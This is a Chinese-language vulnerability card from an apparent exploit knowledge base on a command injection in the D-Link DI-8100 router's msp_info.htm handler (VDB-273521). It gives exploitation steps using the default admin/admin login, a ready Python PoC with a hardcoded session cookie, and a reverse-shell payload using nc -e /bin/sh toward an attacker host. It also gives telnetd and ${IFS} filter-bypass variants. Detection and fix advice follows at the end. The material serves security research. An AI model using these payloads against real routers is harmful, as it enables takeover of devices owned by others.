---
id: iot-dlink-di8100-msp-info-htm-cmd-command-injection
title: D-Link DI-8100 msp_info_htm flag=cmd 命令注入：cmd 参数拼入 system 的 wys 命令
type: scenario
domain: iot
path: iot
technique: dlink-di8100-msp-info-htm-cmd-system-command-injection
tags:
- iot
- dlink
- router
- firmware
- cgi
- command-injection
- mips
- vdb-273521
cve: []
affected_versions: D-Link DI-8100 16.07 / 固件 16.07.26A1（原文复现固件；VDB-273521 描述为 16.07）
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V263
  verified_at: '2026-11-07T17:26:46+08:00'
  notes: V263 复核：已完整重读 content.md 与全部46张图。msp_info_htm 的 flag=cmd 分支（图08）httpd_get_parm(flag) 后 httpd_get_parm(cmd) 进入 sprintf(v28,"wys %s > /tmp/msp.info 2>&1",v16) 再 system(v10)，与卡内原理/触发条件/PoC 一致；图10/13/14 验证 a.txt、xidp.txt 落地，图15 断点 0x44DBF4 处 a0 为完整 wys 命令串。affected_versions D-Link DI-8100 16.07（固件16.07.26A1）与原文/VDB-273521描述一致，已正确标注。dedup 最高分为卡自身 exact，其余候选（upgrade_filter、DIR-615/645/815 service.cgi、boa pin、ssdpcgi）均不同端点/函数/参数/sink，属关联不同链。dup-scan pair0（同篇 msp_info vs upgrade_filter，likely_duplicate）经原文裁决：msp_info.htm?flag=cmd&cmd= vs upgrade_filter.asp?path=，不同函数/参数/命令模板，非同一链，两卡均保留。未本地复跑 PoC；frontmatter 无 sources/source（符合 add 校验禁用要求），亦无 source_url。
url: /docs/iot/iot-dlink-di8100-msp-info-htm-cmd-command-injection/
draft: false
kb_aliases:
- D-Link DI-8100 命令执行
- msp_info.htm
- msp_info_htm
- VDB-273521
- flag=cmd
- wys 命令注入
- jhttpd 命令注入
---

## 一句话结论

D-Link DI-8100 的 `jhttpd` 在 `msp_info.htm` 页面处理函数 `msp_info_htm` 中，当 `flag=cmd` 时把 `cmd` 参数 `sprintf` 进 `"wys %s > /tmp/msp.info 2>&1"` 并交给 `system()` 执行；由于没有转义，`cmd` 中的反引号、分号、管道等 shell 元字符会注入任意命令（VDB-273521）。

## 原理

- `jhttpd` 是 DI-8100 的 Web 服务（FirmAE 仿真中 `ps` 可见其以 admin 运行），`msp_info.htm` 由 `msp_info_htm` 处理。
- 函数开头用 `httpd_get_parm(a1, "flag")` 取 `flag` 参数，并按值走不同分支：`mem` 执行 `cat /proc/meminfo > /tmp/msp.info`、`slab` 执行 `cat /proc/slabinfo > /tmp/msp.info`、`ps` 执行 `ps > /tmp/msp.info`；这些是固定命令。
- 当 `flag` 为 `cmd` 时，函数用 `httpd_get_parm(a1, "cmd")` 取用户可控的 `cmd`，执行 `sprintf(v28, "wys %s > /tmp/msp.info 2>&1", v16)`，然后 `system(v28)`。`%s` 原样展开，`system()` 通过 `/bin/sh -c` 解释，因此 `cmd` 中的反引号（命令替换）、`;`、`|`、`$()` 等都会执行。
- 命令输出被重定向到 `/tmp/msp.info`（可被后续 `stat` 读取），并不直接回显；验证时通常让命令创建文件，再从设备 shell/Web 路径读取。原文用 ``cmd=`echo aaaa>a.txt` `` 在根目录生成 `a.txt`，并在 FirmAE 的 shell 中 `cat` 到 `aaaa`。
- 调试时在 `system` 调用处（原文 0x44DBF4）下断，可见 MIPS `$a0` 指向完整命令串 `wys `echo aaaa>xidp.txt` > /tmp/msp.info 2>&1`，确认参数拼接路径。

## 触发条件

- 目标为 D-Link DI-8100 16.07（原文固件 16.07.26A1），Web 管理面 80 端口可访问。
- 需要有效管理员会话：请求携带登录后的 `wys_userid`/`wys_passwd` Cookie（原文 exp 直接复用了抓包得到的 Cookie，提示该会话可能可重放）。
- 请求 `msp_info.htm` 时带 `flag=cmd` 与 `cmd=<payload>`；`payload` 中的 shell 元字符需 URL 编码（如反引号、空格、`>`）。
- 设备可写文件系统（根目录/`/tmp`）以便落文件验证；若只需反弹 shell，则无需可写路径。

## 利用步骤

1. 登录 DI-8100 管理界面（默认 admin/admin），抓取请求得到 `wys_userid`/`wys_passwd` Cookie。
2. 构造 URL：`/msp_info.htm?flag=cmd&cmd=<URL 编码后的命令>`；原文 payload 为 `` `echo aaaa>a.txt` ``，URL 编码后为 ``%60echo%20aaaa%3Ea.txt%60``。
3. 发送 GET 请求（带 Cookie）；`jhttpd` 进入 `msp_info_htm` 的 `cmd` 分支，执行 `wys <payload> > /tmp/msp.info 2>&1`。
4. 验证：在设备 shell（或 FirmAE 仿真终端）中 `ls` 看到 `a.txt`，`cat a.txt` 内容为 `aaaa`；也可在 `/tmp/msp.info` 查看命令输出。
5. 需要反弹 shell 时把 payload 换成 `;nc <ip> <port> -e /bin/sh;` 或 `;telnetd;` 等，注意目标 busybox 支持的命令集。
6. 若设备无回显，可通过写 Web 目录文件再从浏览器访问，或带外 DNS/HTTP 验证。

## PoC

```python
import requests

target = "http://192.168.0.1:80/msp_info.htm?flag=cmd&cmd=`echo%20aaaa>xidp.txt`"
cookies = {"wys_userid": "admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632"}
headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Connection": "keep-alive",
}
r = requests.get(target, headers=headers, cookies=cookies)
print(r.status_code, "攻击载荷已发送")
```

```text
# 设备侧验证
/ # ls
... a.txt ...
/ # cat a.txt
aaaa
```

## 变体与关联

- 变体：`flag` 还可取 `mem`/`slab`/`ps` 等白名单值执行固定命令；`cmd` 分支是唯一可控注入点。
- 变体：注入符号可用反引号、`;`、`|`、`&&`、`$()`；若目标 shell 对空格/`>` 过滤，可用 `${IFS}`、`$IFS` 等替代。
- 关联：[[iot-dlink-di8100-upgrade-filter-asp-path-command-injection]]（同固件另一条 `upgrade_filter_asp` 命令注入）、[[iot-dlink-dir615-645-815-service-cgi-event-command-injection]]（D-Link 另一系列 CGI 命令注入）、[[code-analysis-reverse-firmware-qemu-system-mipsel-router-httpd]]（路由器固件系统级仿真方法）。
- 边界：需要管理员 Cookie（除非目标存在会话绕过）；命令输出不直接回显；不同固件版本的函数名/参数可能变化。

## 检测与防御

- 检测：`msp_info.htm` 请求中出现 `flag=cmd` 且 `cmd` 含反引号/分号/管道/`$(`；`jhttpd` 派生 shell 进程；`/tmp/msp.info` 异常写入；根目录出现异常文件。
- 修复：升级到厂商修复固件；无法升级时限制管理面仅内网访问，禁用 `msp_info.htm` 或对 `cmd` 做严格白名单。
- 代码层：不要用 `sprintf` 把请求参数拼进 `system()`；改用固定参数数组的 `execve`，或对 `cmd` 只允许预定义枚举值。
- 加固：Web 服务降权、管理面与 WAN 隔离、启用固件签名与安全启动。
